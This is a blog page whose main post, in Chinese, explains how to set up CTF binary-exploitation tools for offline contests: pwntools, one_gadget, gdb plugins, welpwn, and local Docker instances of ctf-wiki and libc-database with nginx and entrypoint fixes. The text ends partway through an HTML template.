<!DOCTYPE html>
<html lang="English">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.4.2',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Copy',
      copy_success: 'Copied',
      copy_failure: 'Copy failed'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="One people that no one know">
<meta property="og:type" content="website">
<meta property="og:title" content="NoOne-hub">
<meta property="og:url" content="https:&#x2F;&#x2F;noone-hub.github.io&#x2F;index.html">
<meta property="og:site_name" content="NoOne-hub">
<meta property="og:description" content="One people that no one know">
<meta property="og:locale" content="English">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://noone-hub.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false,
    isPage: false,
    isArchive: false
  };
</script>

  <title>NoOne-hub</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">NoOne-hub</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">A place that No One knw</p>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/02/pwn-learn-0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/02/pwn-learn-0/" class="post-title-link" itemprop="url">论菜鸡pwn手如何在无网环境（ps：类似国赛)下生存</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-02 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-02T03:14:36+08:00">2019-11-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:58:55" itemprop="dateModified" datetime="2019-10-30T17:58:55+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="论菜鸡pwn手如何在无网环境（ps：类似国赛-下生存"><a href="#论菜鸡pwn手如何在无网环境（ps：类似国赛-下生存" class="headerlink" title="论菜鸡pwn手如何在无网环境（ps：类似国赛)下生存"></a>论菜鸡pwn手如何在无网环境（ps：类似国赛)下生存</h1><p>引言：在打完一次无网环境后，觉得没网环境实在难受，查个libc都没得查。。没准备好，那时碰巧我下了ctf-challenge,在那里碰巧弄到了libc，可能有人喜欢用libc-searcher那个py版本的项目，我不怎么喜欢，用那个导入库查找感觉较慢，还是喜欢手动泄露后到网页查找，于是有了这篇文章</p>
<h2 id="pwntools安装"><a href="#pwntools安装" class="headerlink" title="pwntools安装"></a>pwntools安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
<p>出错自己解决啊，那些个错误都查得到</p>
<h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure>
<h2 id="gdb配置"><a href="#gdb配置" class="headerlink" title="gdb配置"></a>gdb配置</h2><p>我个人觉得，peda和pwndbg必备，gef也可以用上，随你<br>自己写了个脚本，很渣，自选用不用<br><a href="https://github.com/qq1270287245/gdb-plugins" target="_blank" rel="noopener">项目地址</a><br>三个插件一起用会冲突，一部分功能失效，建议注释掉.gdbinit里的gef部分</p>
<h2 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h2><p>这个项目是国防科技大学弄的，挺好用的，最主要是能加载libc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/welpwn</span><br></pre></td></tr></table></figure>
<p>到项目目录下然后</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>
<p>用法你可以看他项目里的介绍</p>
<h2 id="ctf-wiki本地搭建"><a href="#ctf-wiki本地搭建" class="headerlink" title="ctf-wiki本地搭建"></a>ctf-wiki本地搭建</h2><p>作为一个不是啥都熟的选手，ctf-wiki还是必备的，打比赛的时候查查exp，查查用法什么都好</p>
<h3 id="首先安装docker"><a href="#首先安装docker" class="headerlink" title="首先安装docker"></a>首先安装docker</h3><p>这个不讲了</p>
<h3 id="docker-pull镜像"><a href="#docker-pull镜像" class="headerlink" title="docker pull镜像"></a>docker pull镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker search ctf  <span class="comment">#先查找镜像，镜像名知道可以不查找</span></span><br><span class="line">docker pull ctfwiki/ctf-wiki <span class="comment">#pull ctfwiki镜像</span></span><br><span class="line">docker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki <span class="comment">#-d参数为后台运行，--name为名称 -p为端口映射 4100是本地端口，80是docker端口</span></span><br></pre></td></tr></table></figure>


<h2 id="部署libc-database"><a href="#部署libc-database" class="headerlink" title="部署libc-database"></a>部署libc-database</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull blukat29/libc</span><br><span class="line">docker run -p 4101:80 -d blukat29/libc</span><br></pre></td></tr></table></figure>
<p>配置文件目录/etc/nginx/conf.d/nginx.conf<br>启动端口在4101,这里有个小问题，就是无法下载，解决方法，替换nginx的配置文件为如下</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> <span class="variable">@app</span> &#123;</span><br><span class="line">        <span class="attribute">include</span> uwsgi_params;</span><br><span class="line">        <span class="attribute">uwsgi_param</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">uwsgi_param</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">uwsgi_param</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> /static &#123;</span><br><span class="line">        <span class="attribute">alias</span> /app/static;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> /d &#123;</span><br><span class="line">        <span class="attribute">alias</span> /libc-database/db;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ \.symbols$</span> &#123;</span><br><span class="line">            <span class="attribute">default_type</span> text/plain;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最主要是</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /d &#123;</span><br><span class="line">    <span class="attribute">alias</span> /libc-database/db;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.symbols$</span> &#123;</span><br><span class="line">        <span class="attribute">default_type</span> text/plain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后发觉每次重启都会他配置文件都会重置，研究下了他docker里的东西，发觉是entrypoint.sh影响了，所以修改下entrypoint.sh就行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/env bash</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"><span class="comment"># Get the maximum upload file size for Nginx, default to 0: unlimited</span></span><br><span class="line">USE_NGINX_MAX_UPLOAD=<span class="variable">$&#123;NGINX_MAX_UPLOAD:-0&#125;</span></span><br><span class="line"><span class="comment"># Generate Nginx config for maximum upload file size</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"client_max_body_size <span class="variable">$USE_NGINX_MAX_UPLOAD</span>;"</span> &gt; /etc/nginx/conf.d/upload.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the number of workers for Nginx, default to 1</span></span><br><span class="line">USE_NGINX_WORKER_PROCESSES=<span class="variable">$&#123;NGINX_WORKER_PROCESSES:-1&#125;</span></span><br><span class="line"><span class="comment"># Modify the number of worker processes in Nginx config</span></span><br><span class="line">sed -i <span class="string">"/worker_processes\s/c\worker_processes <span class="variable">$&#123;USE_NGINX_WORKER_PROCESSES&#125;</span>;"</span> /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the URL for static files from the environment variable</span></span><br><span class="line">USE_STATIC_URL=<span class="variable">$&#123;STATIC_URL:-'/static'&#125;</span></span><br><span class="line"><span class="comment"># Get the absolute path of the static files from the environment variable</span></span><br><span class="line">USE_STATIC_PATH=<span class="variable">$&#123;STATIC_PATH:-'/app/static'&#125;</span></span><br><span class="line"><span class="comment"># Get the listen port for Nginx, default to 80</span></span><br><span class="line">USE_LISTEN_PORT=<span class="variable">$&#123;LISTEN_PORT:-80&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate Nginx config first part using the environment variables</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"server &#123;</span></span><br><span class="line"><span class="string">    listen 80;</span></span><br><span class="line"><span class="string">    location / &#123;</span></span><br><span class="line"><span class="string">        try_files \$uri @app;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location @app &#123;</span></span><br><span class="line"><span class="string">        include uwsgi_params;</span></span><br><span class="line"><span class="string">        uwsgi_param Host \$host;</span></span><br><span class="line"><span class="string">        uwsgi_param X-Real-IP \$remote_addr;</span></span><br><span class="line"><span class="string">        uwsgi_param X-Forwarded-For \$proxy_add_x_forwarded_for;</span></span><br><span class="line"><span class="string">        uwsgi_pass unix:///tmp/uwsgi.sock;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location /static &#123;</span></span><br><span class="line"><span class="string">        alias /app/static;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location /d &#123;</span></span><br><span class="line"><span class="string">        alias /libc-database/db;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        location ~ \.symbols$ &#123;</span></span><br><span class="line"><span class="string">            default_type text/plain;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;"</span> &gt; /etc/nginx/conf.d/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># If STATIC_INDEX is 1, serve / with /static/index.html directly (or the static URL configured)</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$STATIC_INDEX</span> == 1 ]] ; <span class="keyword">then</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"    location = / &#123;</span></span><br><span class="line"><span class="string">        index <span class="variable">$USE_STATIC_URL</span>/index.html;</span></span><br><span class="line"><span class="string">    &#125;"</span> &gt;&gt; /etc/nginx/conf.d/nginx.conf</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># Finish the Nginx config file</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&#125;"</span> &gt;&gt; /etc/nginx/conf.d/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="string">"<span class="variable">$@</span>"</span></span><br></pre></td></tr></table></figure>
<p>然后就部署完成了,如果还嫌麻烦，可以用下我这个Dockerfile<br><a href="https://github.com/qq1270287245/libcsearcher" target="_blank" rel="noopener">项目地址</a><br>用法在项目里已经说明了，只是修改了一点点错误</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>libc database search<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"</span> <span class="attr">integrity</span>=<span class="string">"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; url_for('static', filename='style.css') &#125;&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://code.jquery.com/ui/1.12.1/themes/start/jquery-ui.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='bootstrap.min.js') &#125;&#125;"</span> <span class="attr">integrity</span>=<span class="string">"sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='jquery-ui.min.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='URI.min.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pull-right"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            View source <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://github.com/blukat29/search-libc"</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            Powered by <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://github.com/niklasb/libc-database"</span>&gt;</span>libc-database<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>libc database search<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-6"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"panel-title panel-title-inline"</span>&gt;</span>Query<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"panel-title-right"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/?q=_rtld_global%3A0"</span>&gt;</span>show all libs<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                /</span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>start over<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"queries"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-inline"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"query-add"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"query-find"</span> <span class="attr">class</span>=<span class="string">"btn btn-success"</span>&gt;</span>Find<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-6"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          &#123;% if libs %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"panel-title"</span>&gt;</span>Matches<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">              &#123;% for lib_name in libs %&#125;</span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span 